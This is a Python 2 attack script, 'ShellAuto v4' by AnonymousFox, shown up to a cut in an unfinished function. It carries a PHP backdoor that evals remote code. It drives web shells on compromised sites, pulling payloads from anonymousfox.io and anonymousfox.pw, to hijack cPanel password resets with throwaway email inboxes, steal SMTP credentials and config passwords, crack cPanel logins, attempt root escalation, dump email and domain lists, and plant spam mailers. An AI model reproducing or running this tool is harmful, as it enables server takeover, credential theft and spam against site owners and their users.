import  re , sys , requests , os , random, string , time
from time import time as timer
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

#donwload python https://www.python.org/downloads/release/python-2714/
#install requests , how ? https://anonymousfox.io/v4/install.txt
#install colorama , how ? https://anonymousfox.io/v4/install.txt
#run like => Shellv4.py shells.txt
#or run like => python Shellv4.py shells.txt

# Notice : Be careful not to use any similar script !! Some sons of the bitch stole the script for the v1 source and v2 source ... 
#           and they attributed our efforts to them! In order to protect our efforts, we have already encrypted v3 , v4 script , 
#           and we will disable all previous versions!

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
   
def URLdomain(site):
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	pattern = re.compile('(.*)/')
	while re.findall(pattern,site):
		sitez = re.findall(pattern,site)
		site = sitez[0]
	return site

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

print """  
  [#] Create By ::
	  ___                                                    ______        
	 / _ \                                                   |  ___|       
	/ /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
	|  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
	| | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  < 
	\_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\ 
	                          __/ |
	                         |___/ ShellAuto v4
"""


shell = """<?php error_reporting(0); if(file_exists(".user.ini")){ unlink(".user.ini"); } echo "FoxAutoV4 , Download => anonymousfox.com\\n"; $code = $_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } ?>"""


requests.packages.urllib3.disable_warnings()

headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}

try:
	target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
	path = str(sys.argv[0]).split('\\')
	exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def file_get_contents(filename):
	with open(filename) as f:
		return f.read()

def changemail():
	session = requests.session()
	payload = {"f": "get_email_address"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload)
	email = r.json()["email_addr"]
	return email,session.cookies

def checkinbox(cookies,user):
	Scode='AnonymousFox'
	cookies={"PHPSESSID":cookies}
	session = requests.session()
	payload = {"f": "set_email_user","email_user":user,"lang":"en"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
	payload = {"f": "check_email", "seq": "1"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
	for email in r.json()["list"]:
		if 'cpanel' in email["mail_from"]:
			email_id = email["mail_id"]
			payload = {"f": "fetch_email", "email_id": email_id}
			r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
			Scode = r.json()['mail_body'].split('<p style="border:1px solid;margin:8px;padding:4px;font-size:16px;width:250px;font-weight:bold;">')[1].split('</p>')[0]
			payload = {"f": "del_email","email_ids[]":int(email_id)}
			r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
		else :
			Scode = 'AnonymousFox'
	return Scode

def checkinboxTestPHP(cookies,user,code):
	rz = 'bad'
	cookies={"PHPSESSID":cookies}
	session = requests.session()
	payload = {"f": "set_email_user","email_user":user,"lang":"en"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
	payload = {"f": "check_email", "seq": "1"}
	r = session.get("http://api.guerrillamail.com/ajax.php", params=payload,cookies=cookies)
	for email in r.json()["list"]:
		if str(code) in email["mail_subject"]:
			rz = 'good'
		else :
			rz = 'bad'
	return rz

def resetPassword(backdor,urlShell, t) :
	try :
		print ' {}[*] Reset Password ..... {}(Waiting)'.format(fw, fr)
		token = ran(3)+'Fox'+ran(3)
		post0 = {'resetlocal': token, 'get3': 'get3' , 'token':t}
		try :
			check = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post0, headers=headers,timeout=15).content
		except:
			check = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post0, headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in check :
			check = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post0, headers=headers,timeout=15).content
		if 'Error-one' in check:
			print ' {}[-] There is no cPanel'.format(fr)
		elif 'Error-two' in check:
			print ' {}[-] Reset Password Disabled'.format(fr)
		elif '<cpanel>' in check :
			cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check)[0]
			domain = re.findall(re.compile('https://(.*):2083\|'), check)[0]
			print ' {}[+] Succeeded => {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt)
			open('Results/cPanelreset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
		else :
			src = str(changemail())
			email = re.findall(re.compile('u\'(.*)\', <RequestsCookieJar'), src)[0]
			cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
			post1 = {'email': email, 'get': 'get'}
			try :
				check = requests.post(backdor+'?php=http://anonymousfox.io/v4/v4.txt', data=post1,headers=headers,timeout=15).content
			except:
				check = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post1, headers=headers,timeout=15).content
			if 'WorkingV4.txt' not in check :
				check = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post1, headers=headers,timeout=15).content
			time.sleep(10)
			code = checkinbox(cookies, email)
			start = timer()
			while ((code == 'AnonymousFox') and ((timer() - start) < 90)):
				time.sleep(30)
				code = checkinbox(cookies, email)
			if (code == 'AnonymousFox') :
				print ' {}[-] Reset Password Failed\n {}[!] Try {}[Semi-Automatic]'.format(fr,fw,fr)
				open('Results/BadcPanelreset.txt', 'a').write('{}\n'.format(urlShell))
				pass
			else :
				post2 = {'code': code, 'get2': 'get2'}
				try :
					check2 = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post2, headers=headers,timeout=15).content
				except:
					check2 = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2, headers=headers,timeout=15).content
				if 'WorkingV4.txt' not in check2:
					check2 = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2, headers=headers,timeout=15).content
				if '<cpanel>' in check2 :
					cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check2)[0]
					domain = re.findall(re.compile('https://(.*):2083\|'), check2)[0]
					print ' {}[+] Succeeded => {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt)
					open('Results/cPanelreset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
				else :
					print ' {}[-] Reset Password Failed\n {}[!] Try {}[Semi-Automatic]'.format(fr,fw,fr)
					open('Results/BadcPanelreset.txt', 'a').write('{}\n'.format(urlShell))
	except:
		print ' {}[-] Reset Password Failed\n {}[!] Try {}[Semi-Automatic]'.format(fr,fw,fr)
		open('Results/BadcPanelreset.txt', 'a').write('{}\n'.format(urlShell))

def resetPassword2(backdor,email) :
	try :
		print ' {}[*] Reset Password ..... {}(Waiting)'.format(fw, fr)
		post = {'email': email, 'get': 'get'}
		try :
			check = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post, headers=headers,timeout=15).content
		except:
			check = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in check :
			check = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if 'Error-one' in check:
			print ' {}[-] There is no cPanel'.format(fr)
		elif 'Error-two' in check:
			print ' {}[-] Reset Password Disabled'.format(fr)
		elif './Done' in check :
			print' {}[+] The system sent the security code to your email !'.format(fg)
			code = str(raw_input(' {}[!] Enter the security code :{} '.format(fw,fr)))
			post2 = {'code': code, 'get2': 'get2'}
			try :
				check2 = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post2, headers=headers,timeout=15).content
			except:
				check2 = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2, headers=headers,timeout=15).content
			if 'WorkingV4.txt' not in check2:
				check2 = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2, headers=headers,timeout=15).content
			if '<cpanel>' in check2 :
				cpanelRt = re.findall(re.compile(':2083\|(.*)</cpanel>'), check2)[0]
				domain = re.findall(re.compile('https://(.*):2083\|'), check2)[0]
				print ' {}[+] Succeeded => {}https://{}:2083|{}'.format(fg, fr, domain, cpanelRt)
				open('Results/cPanelreset.txt', 'a').write('https://{}:2083|{}'.format(domain, cpanelRt) + '\n')
			else :
				print ' {}[-] Reset Password Failed'.format(fr)
	except:
		print' {}[-] Reset Password Failed'.format(fr)

def finderSMTP(backdor) :
	try :
		post = {'finderSMTP': 'AnonymousFox'}
		print ' {}[*] Finder SMTP ..... {}(Waiting)'.format(fw, fr)
		try :
			finderSMTP = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=15).content
		except:
			finderSMTP = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post,headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in finderSMTP:
			finderSMTP = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if '<findersmtp>' in finderSMTP :
			if re.findall(re.compile('<findersmtp>(.*)</findersmtp>'), finderSMTP):
				SMTPs = re.findall(re.compile('<findersmtp>(.*)</findersmtp>'), finderSMTP)
			for SMTP in SMTPs:
				if '!!' in SMTP :
					SMTP = SMTP.replace("!!", "@")
				print ' {}   - {}{}'.format(fg, fr, SMTP)
				open('Results/SMTPs.txt', 'a').write(SMTP + '\n')
		else :
			print ' {}[-] There is no SMTP'.format(fr)
	except:
		print' {}[-] Failed'.format(fr)

def getSMTP(backdor) :
	try :
		post = {'getSMTP': 'AnonymousFox'}
		print ' {}[*] Create SMTP ..... {}(Waiting)'.format(fw, fr)
		try :
			getSMTP = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=15).content
		except:
			getSMTP = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post,headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in getSMTP:
			getSMTP = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if '<smtp>' in getSMTP :
			smtpC = re.findall(re.compile('<smtp><domain>Domian => (.*)</domain><port><br>Port => (.*)</port><smtpname><br>SMTPname => (.*)</smtpname><password><br>Password => (.*)</password></smtp>'),getSMTP)[0]
			smtp = '{}|{}|{}@{}|{}'.format(smtpC[0], smtpC[1], smtpC[2], smtpC[0], smtpC[3])
			print ' {}[+] Succeeded => {}{}'.format(fg, fr, smtp)
			open('Results/SMTPs_Create.txt', 'a').write(smtp + '\n')
		else :
			print ' {}[-] Failed'.format(fr)
	except:
		print' {}[-] Failed'.format(fr)

def finderScript(backdor,shell) :
	try :
		print ' {}[*] Finder Script ..... {}(Waiting)'.format(fw, fr)
		post = {'pwd': 'AnonymousFox'}
		try :
			srcServer = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt',data=post, headers=headers,timeout=15).content
		except:
			srcServer = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in srcServer :
			srcServer = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=15).content
		uname = re.findall(re.compile('<uname><font color="red"><center>(.*)</center> </font><br></uname>'), srcServer)[0]
		pwd = re.findall(re.compile('<pwd><font color="blue"><center>(.*)</center></font><br></pwd>'), srcServer)[0]
		print ' {}[U] '.format(fm) + uname
		print ' {}[P] '.format(fm) + pwd
		open('Results/pwd_uname.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname,pwd,shell))
		if '[-] Windows' in srcServer:
			print ' {}[S] Windows'.format(fr)
		else:
			print ' {}[S] Linux server'.format(fg)
			if ' 2015 ' in uname or ' 2014 ' in uname or ' 2013 ' in uname or ' 2012 ' in uname or ' 2011 ' in uname or ' 2010 ' in uname :
				open('Results/Roots_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
			elif ' 2016 ' in uname:
				if ' Dec ' not in uname and ' Nov ' not in uname:
					open('Results/Roots_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
			if '[+] cPanel' in srcServer:
				print ' {}[+] cPanel script'.format(fg)
				open('Results/cPanels_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
			elif '[+] vHosts' in srcServer:
				print ' {}[+] vHosts script'.format(fg)
				open('Results/vHosts_servers.txt', 'a').write('{}\n{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(uname, pwd, shell))
	except:
		print' {}[-] Failed'.format(fr)

def accesshash(backdor,shell) :
	try:
		print ' {}[*] Accesshash & .my.cnf ..... {}(Waiting)'.format(fw, fr)
		post = {'acc': 'AnonymousFox'}
		try :
			checkacc = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post, headers=headers,timeout=15).content
		except:
			checkacc = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in checkacc :
			checkacc = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if '[+] Accesshash' in checkacc :
			print ' {}  -{} {} => {}[{}Accesshash{}]'.format(fr,fg,shell,fr,fg,fr)
			open('Results/accesshash.txt', 'a').write('{}?php=http://anonymousfox.io/v4/accesshash.txt\n'.format(backdor))
		else :
			print ' {}  - {} => [NotFoundAccesshash]'.format(fr, shell)
		if '[+] mycnf' in checkacc :
			print ' {}  -{} {} => {}[{}Mycnf{}]'.format(fr,fg,shell,fr,fg,fr)
			open('Results/mycnf.txt', 'a').write('{}?php=http://anonymousfox.io/v4/mycnf.txt\n'.format(backdor))
		else :
			print ' {}  - {} => [NotFoundMycnf]'.format(fr, shell)
	except:
		print' {}[-] Failed'.format(fr)

def getConfig(backdor,shell,x):
	try :
		s1 = backdor
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		sh_path = backdor.replace(s1, 'F0xAutoConfig/')
		post = {'config': 'AnonymousFox'}
		print ' {}[*] Trying get Config ..... {}(Waiting)'.format(fw,fr)
		try :
			getConfig = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=120).content
		except :
			getConfig = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=120).content
		if 'WorkingV4.txt' not in getConfig:
			getConfig = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=120).content
		checkConfig = requests.get(sh_path, headers=headers,timeout=120).content
		if 'Index of' in checkConfig :
			print ' {}[+] Config => {}{}'.format(fg,fr,sh_path)
			open('Results/Configs.txt', 'a').write('{}\n{}\n-----------------------------------------------------------------------------------------------------\n'.format(shell, sh_path))
			if x == 1 :
				getConfigPasswords_cPanelcracker(backdor, sh_path)
			if x == 2 :
				MassGetMails(backdor, sh_path)
		else :
			print ' {}[-] Failed'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def getConfigPasswords_cPanelcracker(backdor,config) :
	try:
		print ' {}[*] GetPasswords/CPanelCrack ..... {}(Waiting)'.format(fw, fr)
		post = {'dir':config,'getPasswords':'AnonymousFox'}
		try:
			getPassword = requests.post(backdor+'?php=http://anonymousfox.io/v4/v4.txt', data=post, headers=headers,timeout=180).content
		except:
			getPassword = requests.post(backdor+'?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=180).content
		if 'WorkingV4.txt' not in getPassword:
			getPassword = requests.post(backdor+'?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=180).content
		try :
			getUsername = requests.get(backdor+'?php=http://anonymousfox.io/v4/cp.txt', headers=headers,timeout=30).content
		except:
			getUsername = requests.get(backdor+'?php=http://anonymousfox.pw/v4/cp.txt', headers=headers,timeout=30).content
		if 'AnonymousFox' not in getUsername:
			getUsername = requests.get(backdor+'?php=http://anonymousfox.pw/v4/cp.txt', headers=headers,timeout=30).content
		if 'Problem101' in getPassword :
			print' {}[-] Please , Check form this manually'.format(fr)
		elif '<password>' in getPassword :
			passwords = []
			usernames = []
			if re.findall(re.compile('<br><password>(.*)</password>'), getPassword):
				passwords = re.findall(re.compile('<br><password>(.*)</password>'),getPassword)
			if re.findall(re.compile('<user>(.*)</user>'), getUsername):
				usernames = re.findall(re.compile('<user>(.*)</user>'),getUsername)
			for password in passwords:
				p = open('passwords.txt', 'a')
				p.write(password+'\n')
				p.close()
			for username in usernames:
				u = open('usernames.txt', 'a')
				u.write(username+'\n')
				u.close()
			username = file_get_contents('usernames.txt')
			password = file_get_contents('passwords.txt')
			post = {'page': 'find', 'type': 'simple','passwords':password,'usernames':username}
			try :
				cPanelcracker = requests.post(backdor+'?php=http://anonymousfox.io/v4/cp.txt', data=post, headers=headers,timeout=180).content
			except:
				cPanelcracker = requests.post(backdor+'?php=http://anonymousfox.pw/v4/cp.txt', data=post, headers=headers,timeout=180).content
			if 'AnonymousFox' not in cPanelcracker:
				cPanelcracker = requests.post(backdor+'?php=http://anonymousfox.pw/v4/cp.txt', data=post, headers=headers,timeout=180).content
			if '<center><font color=blue>You Found 0 cPanel' in cPanelcracker :
				print ' {}[-] Found 0 cPanel'.format(fr)
			else :
				n = re.findall(re.compile('<center><font color=blue>You Found (.*) cPanel \(Cracker\)</font></center>'), cPanelcracker)[0]
				if re.findall(re.compile('<center> Host : https://(.*):2083 User : <b><font color=#1eca33>(.*)</font></b> Password : <b><font color=red>(.*)</font></b><br /></center>'), cPanelcracker):
					cpanels = re.findall(re.compile('<center> Host : https://(.*):2083 User : <b><font color=#1eca33>(.*)</font></b> Password : <b><font color=red>(.*)</font></b><br /></center>'),cPanelcracker)
				print ' {}[+] Found {} cPanel'.format(fg,n)
				for cpanel in cpanels:
					cp ='https://'+cpanel[0]+':2083|'+cpanel[1]+'|'+cpanel[2]
					print' {}   - {}'.format(fg,fr) + cp
					open('Results/cPanelCrack.txt', 'a').write(cp + '\n')
			if os.path.isfile("usernames.txt"):
				os.remove("usernames.txt")
			if os.path.isfile("passwords.txt"):
				os.remove("passwords.txt")
		else :
			print ' {}[-] Not found Config'.format(fr)
	except:
		print' {}[-] Please , Check form this manually'.format(fr)
		if os.path.isfile("usernames.txt"):
			os.remove("usernames.txt")
		if os.path.isfile("passwords.txt"):
			os.remove("passwords.txt")

def getRoot(backdor):
	try :
		s1 = backdor
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		sh_path = backdor.replace(s1, 'F0xAutoConfig/')
		post = {'getRoot': 'AnonymousFox'}
		post2 = {'checkRoot': 'AnonymousFox'}
		print ' {}[*] Trying get Root ..... {}(Waiting)'.format(fw,fr)
		try :
			getRoot = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=180).content
		except :
			try :
				getRoot = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=180).content
			except:
				getRoot = 'WorkingV4.txt'
				pass
		if 'WorkingV4.txt' not in getRoot:
			try :
				getRoot = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=180).content
			except:
				getRoot = 'WorkingV4.txt'
				pass
		if 'Error1-Root' in getRoot :
			print ' {}[-] Try it manually with perl script'.format(fr)
			return
		if 'Error2-Root' in getRoot :
			print ' {}[-] It doesn\'t work with ./dirty'.format(fr)
			return
		time.sleep(30)
		try :
			checkRoot = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post2,headers=headers,timeout=15).content
		except :
			try :
				checkRoot = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post2, headers=headers,timeout=15).content
			except:
				checkRoot = 'WorkingV4.txt'
				pass
		if 'WorkingV4.txt' not in checkRoot:
			try :
				checkRoot = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post2, headers=headers,timeout=15).content
			except:
				checkRoot = 'WorkingV4.txt'
				pass
		if '<root>' in checkRoot :
			ip = re.findall(re.compile('<root><ip>IP => (.*)</ip>'), checkRoot)[0]
			print ' {}[+] Succeeded =>{} IP => {} | PORT => 22 | USERNAME => root | PASSWORD => 0'.format(fg, fr,ip)
			print ' {}[!] Note :: 22 , It is the default port , If it does not work , Execute: [{}netstat -lnp --ip{}]'.format(fw, fr, fw)
			open('Results/root.txt', 'a').write('{}|22|root|0\n'.format(ip))
		else :
			print ' {}[-] Failed'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def getDomains(backdor):
	try :
		post = {'getDomains': 'AnonymousFox'}
		print ' {}[*] Trying get Domains ..... {}(Waiting)'.format(fw,fr)
		try :
			getDomains = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=30).content
		except :
			getDomains = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=30).content
		if 'WorkingV4.txt' not in getDomains:
			getDomains = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=30).content
		if '<ip>' in getDomains :
			ip = re.findall(re.compile('<ip>(.*)</ip>'), getDomains)[0]
			print ' {}[+] Saved in {}Results/Domains_lists/{}.txt'.format(fg, fr, ip)
			if "FoxAutoV4 , Download => anonymousfox.com\n" in  getDomains :
				getDomains = getDomains.replace("FoxAutoV4 , Download => anonymousfox.com\n", "")
			if "WorkingV4.txt\n" in getDomains :
				getDomains = getDomains.replace("WorkingV4.txt\n", "")
			if "<head><title>FoxAutoV4</title></head>\n" in getDomains :
				getDomains = getDomains.replace("<head><title>FoxAutoV4</title></head>\n", "")
			if "<ip>{}</ip>".format(ip) in getDomains :
				getDomains = getDomains.replace("<ip>{}</ip>".format(ip), "")
			patheListDomains = r'Results/Domains_lists'
			if not os.path.exists(patheListDomains):
				os.makedirs(patheListDomains)
			open('Results/Domains_lists/{}.txt'.format(ip), 'w').write(getDomains)
			open('Results/Domains_lists/0.0.0.0.All.txt', 'a').write(getDomains)
		else :
			print ' {}[-] Failed'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def getMails(backdor):
	try :
		post = {'getMails': 'AnonymousFox'}
		post2 = {'checkList': 'AnonymousFox'}
		print ' {}[*] Trying get Mails ..... {}(Waiting)'.format(fw,fr)
		try :
			getMails = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=610).content
		except :
			try :
				getMails = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=610).content
			except:
				getMails = ''
		if 'WorkingV4.txt' not in getMails:
			try :
				getMails = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt',data=post, headers=headers,timeout=610).content
			except:
				getMails = ''
		if '<badconfig>' not in getMails :
			time.sleep(30)
			try :
				checkList = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post2,headers=headers,timeout=30).content
			except:
				checkList = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2,headers=headers,timeout=30).content
			if 'WorkingV4.txt' not in checkList:
				checkList = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2,headers=headers,timeout=30).content
			if "<domain>" in checkList :
				domain = re.findall(re.compile('<domain>(.*)</domain>'), checkList)[0]
				print ' {}[+] Saved in {}Results/Emails_lists/{}.txt'.format(fg, fr, domain)
				if "FoxAutoV4 , Download => anonymousfox.com\n" in  checkList :
					checkList = checkList.replace("FoxAutoV4 , Download => anonymousfox.com\n", "")
				if "WorkingV4.txt\n" in checkList :
					checkList = checkList.replace("WorkingV4.txt\n", "")
				if "<head><title>FoxAutoV4</title></head>\n" in checkList :
					checkList = checkList.replace("<head><title>FoxAutoV4</title></head>\n", "")
				if "<domain>{}</domain>".format(domain) in checkList :
					checkList = checkList.replace("<domain>{}</domain>".format(domain), "")
				patheListEmails = r'Results/Emails_lists'
				if not os.path.exists(patheListEmails):
					os.makedirs(patheListEmails)
				open('Results/Emails_lists/{}.txt'.format(domain), 'w').write(checkList)
			else :
				print ' {}[-] There is no Email'.format(fr)
		else :
			print ' {}[-] There is no Config'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def MassGetMails(backdor,config):
	try :
		post = {'dir' : config,'MassGetMails': 'AnonymousFox'}
		post2 = {'checkList': 'AnonymousFox'}
		print ' {}[*] Trying get Mails ..... {}(Waiting)'.format(fw,fr)
		try :
			getMails = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post,headers=headers,timeout=1220).content
		except :
			getMails = ''
		if '<badconfig>' not in getMails :
			time.sleep(60)
			try :
				checkList = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post2,headers=headers,timeout=60).content
			except:
				checkList = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2,headers=headers,timeout=60).content
			if 'WorkingV4.txt' not in checkList:
				checkList = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post2,headers=headers,timeout=60).content
			if "<domain>" in checkList :
				domain = re.findall(re.compile('<domain>(.*)</domain>'), checkList)[0]
				print ' {}[+] Saved in {}Results/Emails_lists/{}_config.txt'.format(fg, fr, domain)
				if "FoxAutoV4 , Download => anonymousfox.com\n" in  checkList :
					checkList = checkList.replace("FoxAutoV4 , Download => anonymousfox.com\n", "")
				if "WorkingV4.txt\n" in checkList :
					checkList = checkList.replace("WorkingV4.txt\n", "")
				if "<head><title>FoxAutoV4</title></head>\n" in checkList :
					checkList = checkList.replace("<head><title>FoxAutoV4</title></head>\n", "")
				if "<domain>{}</domain>".format(domain) in checkList :
					checkList = checkList.replace("<domain>{}</domain>".format(domain), "")
				patheListEmails = r'Results/Emails_lists'
				if not os.path.exists(patheListEmails):
					os.makedirs(patheListEmails)
				open('Results/Emails_lists/{}_config.txt'.format(domain), 'w').write(checkList)
			else :
				print ' {}[-] There is no Email'.format(fr)
		else :
			print ' {}[-] There is no Config'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def uploadMailerOlux(backdor,mailerOlux):
	try:
		print' {}[*] Upload Miller Olux ..... {}(Waiting)'.format(fw, fr)
		mailer_pass = ran(10)
		mailer_text = mailerOlux.replace("AnonymousFox", mailer_pass)
		filename = ran(10) + '.php'
		s1 = backdor
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		mailer_path = backdor.replace(s1, filename)
		filedata = {'upload': 'upload'}
		fileup = {'file': (filename, mailer_text)}
		try :
			upMailer = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=filedata, files=fileup, headers=headers,timeout=30)
		except:
			upMailer = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, files=fileup, headers=headers, timeout=30)
		if 'WorkingV4.txt' not in upMailer.content :
			upMailer = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, files=fileup, headers=headers, timeout=30)
		if upMailer.status_code == 200 :
			print ' {}[+] Succeeded => {}{}?pass={}'.format(fg,fr,mailer_path,mailer_pass)
			open('Results/mailerOlux.txt', 'a').write('{}?pass={}\n'.format(mailer_path,mailer_pass))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)
        
def uploadMailerXleet(backdor,mailerXleet):
	try:
		print' {}[*] Upload Miller Xleet ..... {}(Waiting)'.format(fw, fr)
		mailer_pass = ran(10)
		mailer_text = mailerXleet.replace("AnonymousFox", mailer_pass)
		filename = ran(10) + '.php'
		s1 = backdor
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		mailer_path = backdor.replace(s1, filename)
